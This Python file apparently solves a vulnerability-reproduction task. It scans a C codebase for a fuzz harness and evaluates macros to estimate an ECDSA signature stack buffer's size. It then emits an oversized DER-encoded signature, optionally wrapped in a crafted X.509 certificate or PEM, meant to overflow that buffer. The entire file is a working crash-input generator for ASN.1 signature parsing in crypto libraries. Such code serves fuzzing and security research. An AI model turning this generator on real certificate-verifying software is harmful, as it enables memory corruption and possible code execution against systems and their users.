import os
import re
import io
import ast
import tarfile
import base64
import tempfile
from collections import Counter
from typing import Dict, Optional, Tuple, List, Iterable


_ALLOWED_EXTS = {
    ".c", ".cc", ".cpp", ".cxx",
    ".h", ".hh", ".hpp", ".hxx",
    ".inc", ".inl", ".ipp",
    ".S", ".s",
}


def _is_text_path(p: str) -> bool:
    p = p.lower()
    _, ext = os.path.splitext(p)
    return ext in _ALLOWED_EXTS


def _iter_text_files_from_dir(root: str, max_file_bytes: int = 2_000_000) -> Iterable[Tuple[str, str]]:
    for dp, _, fns in os.walk(root):
        for fn in fns:
            path = os.path.join(dp, fn)
            rel = os.path.relpath(path, root)
            if not _is_text_path(rel):
                continue
            try:
                st = os.stat(path)
                if st.st_size > max_file_bytes:
                    continue
                with open(path, "rb") as f:
                    b = f.read()
            except Exception:
                continue
            try:
                txt = b.decode("utf-8", "ignore")
            except Exception:
                continue
            yield rel.replace(os.sep, "/"), txt


def _iter_text_files_from_tar(tar_path: str, max_file_bytes: int = 2_000_000) -> Iterable[Tuple[str, str]]:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            if not _is_text_path(name):
                continue
            if m.size > max_file_bytes:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                b = f.read()
            except Exception:
                continue
            try:
                txt = b.decode("utf-8", "ignore")
            except Exception:
                continue
            yield name, txt


def _iter_text_files(src_path: str) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        yield from _iter_text_files_from_dir(src_path)
    else:
        yield from _iter_text_files_from_tar(src_path)


_DEFINE_RE = re.compile(r'^[ \t]*#[ \t]*define[ \t]+([A-Za-z_]\w*)(?!\s*\()([ \t]+(.+?))?[ \t]*$', re.M)
_COMMENT_BLOCK_RE = re.compile(r"/\*.*?\*/", re.S)
_COMMENT_LINE_RE = re.compile(r"//.*?$", re.M)
_INT_SUFFIX_RE = re.compile(r"(?<![A-Za-z0-9_])((?:0x[0-9A-Fa-f]+)|(?:\d+))([uUlL]+)\b")
_CAST_RE = re.compile(r"\(\s*(?:unsigned|signed|long|short|int|char|size_t|ssize_t|ptrdiff_t|word32|word16|word8|byte|u8|u16|u32|u64|i8|i16|i32|i64|uint8_t|uint16_t|uint32_t|uint64_t|int8_t|int16_t|int32_t|int64_t)\s*\)")


class _SafeIntEvaluator:
    __slots__ = ("macro_exprs", "macro_vals", "visiting")

    def __init__(self, macro_exprs: Dict[str, str]):
        self.macro_exprs = macro_exprs
        self.macro_vals: Dict[str, int] = {}
        self.visiting = set()

    def _clean_expr(self, expr: str) -> str:
        expr = _COMMENT_BLOCK_RE.sub("", expr)
        expr = _COMMENT_LINE_RE.sub("", expr)
        expr = expr.strip()
        expr = _CAST_RE.sub("", expr)
        expr = _INT_SUFFIX_RE.sub(r"\1", expr)
        expr = expr.replace("/", "//")
        expr = expr.replace("<<", " << ").replace(">>", " >> ")
        expr = expr.replace("|", " | ").replace("&", " & ").replace("^", " ^ ")
        return expr

    def _eval_ast(self, node) -> int:
        if isinstance(node, ast.Expression):
            return self._eval_ast(node.body)
        if isinstance(node, ast.Constant):
            if isinstance(node.value, (int, bool)):
                return int(node.value)
            raise ValueError("non-int constant")
        if isinstance(node, ast.Num):  # pragma: no cover
            return int(node.n)
        if isinstance(node, ast.Name):
            v = self.get(node.id)
            if v is None:
                raise ValueError(f"unknown name: {node.id}")
            return int(v)
        if isinstance(node, ast.UnaryOp):
            a = self._eval_ast(node.operand)
            if isinstance(node.op, ast.UAdd):
                return +a
            if isinstance(node.op, ast.USub):
                return -a
            if isinstance(node.op, ast.Invert):
                return ~a
            raise ValueError("bad unary op")
        if isinstance(node, ast.BinOp):
            a = self._eval_ast(node.left)
            b = self._eval_ast(node.right)
            op = node.op
            if isinstance(op, ast.Add):
                return a + b
            if isinstance(op, ast.Sub):
                return a - b
            if isinstance(op, ast.Mult):
                return a * b
            if isinstance(op, (ast.Div, ast.FloorDiv)):
                if b == 0:
                    raise ValueError("div by zero")
                return a // b
            if isinstance(op, ast.Mod):
                if b == 0:
                    raise ValueError("mod by zero")
                return a % b
            if isinstance(op, ast.LShift):
                return a << b
            if isinstance(op, ast.RShift):
                return a >> b
            if isinstance(op, ast.BitOr):
                return a | b
            if isinstance(op, ast.BitAnd):
                return a & b
            if isinstance(op, ast.BitXor):
                return a ^ b
            raise ValueError("bad binop")
        if isinstance(node, ast.ParenExpr):  # pragma: no cover
            return self._eval_ast(node.value)
        raise ValueError("disallowed node")

    def eval_expr(self, expr: str) -> Optional[int]:
        expr = self._clean_expr(expr)
        if not expr:
            return None
        if any(tok in expr for tok in ("?", ":", "&&", "||", "sizeof", "{", "}", "[", "]", "->", ".")):
            return None
        try:
            tree = ast.parse(expr, mode="eval")
        except Exception:
            try:
                if expr.startswith("(") and expr.endswith(")"):
                    tree = ast.parse(expr[1:-1], mode="eval")
                else:
                    return None
            except Exception:
                return None
        try:
            return int(self._eval_ast(tree))
        except Exception:
            return None

    def get(self, name: str) -> Optional[int]:
        if name in self.macro_vals:
            return self.macro_vals[name]
        if name in self.visiting:
            return None
        expr = self.macro_exprs.get(name)
        if not expr:
            return None
        self.visiting.add(name)
        v = self.eval_expr(expr)
        self.visiting.remove(name)
        if v is None:
            return None
        self.macro_vals[name] = int(v)
        return int(v)


def _collect_macros(files: List[Tuple[str, str]]) -> Dict[str, str]:
    macro_exprs: Dict[str, str] = {}
    for _, txt in files:
        for m in _DEFINE_RE.finditer(txt):
            name = m.group(1)
            rhs = m.group(3) or ""
            rhs = rhs.strip()
            if not rhs:
                continue
            if '"' in rhs or "'" in rhs:
                continue
            if rhs.startswith("\\"):
                continue
            rhs = rhs.split("\\", 1)[0].strip()
            if not rhs:
                continue
            rhs = _COMMENT_BLOCK_RE.sub("", rhs)
            rhs = _COMMENT_LINE_RE.sub("", rhs)
            rhs = rhs.strip()
            if not rhs:
                continue
            macro_exprs.setdefault(name, rhs)
    return macro_exprs


def _score_harness_text(txt: str) -> int:
    t = txt.lower()
    score = 0
    if "llvmfuzzertestoneinput" in t:
        score += 50
    if "fuzzeddataprovider" in t:
        score += 10
    for kw, w in [
        ("ecdsa", 30),
        ("asn1", 20),
        ("x509", 20),
        ("certificate", 15),
        ("signature", 15),
        ("verify", 10),
        ("der", 10),
        ("pem", 10),
    ]:
        if kw in t:
            score += w
    return score


def _find_harness(files: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
    candidates = []
    for path, txt in files:
        if "LLVMFuzzerTestOneInput" in txt:
            candidates.append((path, txt))
    if not candidates:
        main_re = re.compile(r"\bint\s+main\s*\(", re.M)
        for path, txt in files:
            if main_re.search(txt):
                candidates.append((path, txt))
    if not candidates:
        return None
    candidates.sort(key=lambda x: _score_harness_text(x[1]), reverse=True)
    return candidates[0]


def _detect_input_kind(harness_txt: str) -> str:
    t = harness_txt.lower()
    if ("pem_read_bio_x509" in t) or ("pem_read" in t and "x509" in t):
        return "pem_x509"
    if ("d2i_x509" in t) or ("x509" in t and "crt_parse" in t) or ("x509" in t and "certificate" in t):
        return "der_x509"
    if "ecdsa" in t and ("signature" in t or "verify" in t or "sig" in t or "asn1" in t):
        return "raw_sig"
    return "raw_sig"


_ARRAY_DECL_RE = re.compile(
    r"\b(?:unsigned\s+char|uint8_t|char|byte|word8|u8)\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+)\s*\]\s*;",
    re.M,
)


def _guess_sig_stack_buffer_size(files: List[Tuple[str, str]], evaluator: _SafeIntEvaluator) -> Optional[int]:
    sizes = []
    for path, txt in files:
        tl = txt.lower()
        if "ecdsa" not in tl:
            continue
        if "asn" not in tl and "asn1" not in tl:
            continue
        if "integer" not in tl and "asn_integer" not in txt:
            continue
        if "memcpy" not in tl and "xmemcpy" not in tl and "memmove" not in tl:
            continue

        for m in _ARRAY_DECL_RE.finditer(txt):
            var = m.group(1)
            if var not in ("r", "s", "rs", "rb", "sb", "sig_r", "sig_s", "sig_r_buf", "sig_s_buf"):
                continue
            expr = m.group(2)
            v = evaluator.eval_expr(expr)
            if v is None:
                continue
            if 16 <= v <= 1_000_000:
                sizes.append(v)

    if not sizes:
        for name in ("MAX_ECC_BYTES", "ECC_MAX_BYTES", "MAX_ECC_SIG_SIZE", "ECC_MAX_SIG_SIZE", "MAX_SIG_SIZE", "MAX_SIGNATURE_SIZE"):
            v = evaluator.get(name)
            if v is not None and 16 <= v <= 1_000_000:
                return int(v)
        return None

    c = Counter(sizes)
    likely = []
    for k, cnt in c.items():
        if 16 <= k <= 262144:
            likely.append((cnt, k))
    if not likely:
        return None
    likely.sort(key=lambda x: (-x[0], x[1]))
    return int(likely[0][1])


def _der_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 128:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _der_tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(value)) + value


def _der_integer_from_bytes(v: bytes) -> bytes:
    if not v:
        v = b"\x00"
    if v[0] & 0x80:
        v = b"\x00" + v
    return _der_tlv(0x02, v)


def _der_sequence(items: List[bytes]) -> bytes:
    return _der_tlv(0x30, b"".join(items))


def _oid_bytes(oid: str) -> bytes:
    parts = [int(x) for x in oid.split(".")]
    if len(parts) < 2:
        raise ValueError("bad oid")
    if parts[0] > 2 or parts[1] >= 40:
        raise ValueError("bad oid")
    out = bytearray()
    out.append(parts[0] * 40 + parts[1])
    for p in parts[2:]:
        if p < 0:
            raise ValueError("bad oid part")
        stack = []
        if p == 0:
            stack.append(0)
        else:
            while p:
                stack.append(p & 0x7F)
                p >>= 7
        for i in reversed(range(len(stack))):
            b = stack[i]
            if i != 0:
                b |= 0x80
            out.append(b)
    return bytes(out)


def _der_oid(oid: str) -> bytes:
    return _der_tlv(0x06, _oid_bytes(oid))


def _der_null() -> bytes:
    return b"\x05\x00"


def _der_bit_string(payload: bytes) -> bytes:
    return _der_tlv(0x03, b"\x00" + payload)


def _der_utf8(s: str) -> bytes:
    return _der_tlv(0x0C, s.encode("utf-8"))


def _der_printable(s: str) -> bytes:
    return _der_tlv(0x13, s.encode("ascii", "ignore"))


def _der_utctime(s: str) -> bytes:
    return _der_tlv(0x17, s.encode("ascii"))


def _der_set(items: List[bytes]) -> bytes:
    return _der_tlv(0x31, b"".join(items))


def _der_explicit_ctx0(inner: bytes) -> bytes:
    return _der_tlv(0xA0, inner)


_P256_G_UNCOMPRESSED = bytes.fromhex(
    "04"
    "6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"
    "4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"
)


def _build_x509_cert(sig_der: bytes) -> bytes:
    oid_common_name = "2.5.4.3"
    oid_ecdsa_with_sha256 = "1.2.840.10045.4.3.2"
    oid_id_ec_public_key = "1.2.840.10045.2.1"
    oid_prime256v1 = "1.2.840.10045.3.1.7"

    alg_sig = _der_sequence([_der_oid(oid_ecdsa_with_sha256)])
    alg_spki = _der_sequence([_der_oid(oid_id_ec_public_key), _der_oid(oid_prime256v1)])
    spki = _der_sequence([alg_spki, _der_bit_string(_P256_G_UNCOMPRESSED)])

    rdns = _der_sequence([
        _der_set([
            _der_sequence([
                _der_oid(oid_common_name),
                _der_utf8("a"),
            ])
        ])
    ])
    validity = _der_sequence([
        _der_utctime("250101000000Z"),
        _der_utctime("260101000000Z"),
    ])

    version_v3 = _der_explicit_ctx0(_der_integer_from_bytes(b"\x02"))
    serial = _der_integer_from_bytes(b"\x01")

    tbs = _der_sequence([
        version_v3,
        serial,
        alg_sig,
        rdns,
        validity,
        rdns,
        spki,
    ])

    cert = _der_sequence([
        tbs,
        alg_sig,
        _der_bit_string(sig_der),
    ])
    return cert


def _to_pem(der: bytes, header: str) -> bytes:
    b64 = base64.b64encode(der).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    s = f"-----BEGIN {header}-----\n" + "\n".join(lines) + f"\n-----END {header}-----\n"
    return s.encode("ascii")


def _gen_ecdsa_sig_der(r_len: int, s_len: int = 1) -> bytes:
    if r_len <= 0:
        r_len = 1
    if s_len <= 0:
        s_len = 1
    r = b"\x01" * r_len
    s = b"\x01" * s_len
    return _der_sequence([_der_integer_from_bytes(r), _der_integer_from_bytes(s)])


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            files = list(_iter_text_files(src_path))
        except Exception:
            files = []

        harness = _find_harness(files) if files else None
        harness_txt = harness[1] if harness else ""
        kind = _detect_input_kind(harness_txt) if harness_txt else "raw_sig"

        macro_exprs = _collect_macros(files) if files else {}
        evaluator = _SafeIntEvaluator(macro_exprs)

        buf_sz = _guess_sig_stack_buffer_size(files, evaluator) if files else None

        if buf_sz is None:
            r_len = 32769
        else:
            # overflow with some slack while staying modest
            r_len = int(buf_sz) + 8
            if r_len < 256:
                r_len = 256

        sig_der = _gen_ecdsa_sig_der(r_len=r_len, s_len=1)

        if kind == "raw_sig":
            return sig_der
        if kind == "der_x509":
            return _build_x509_cert(sig_der)
        if kind == "pem_x509":
            der = _build_x509_cert(sig_der)
            return _to_pem(der, "CERTIFICATE")
        return sig_der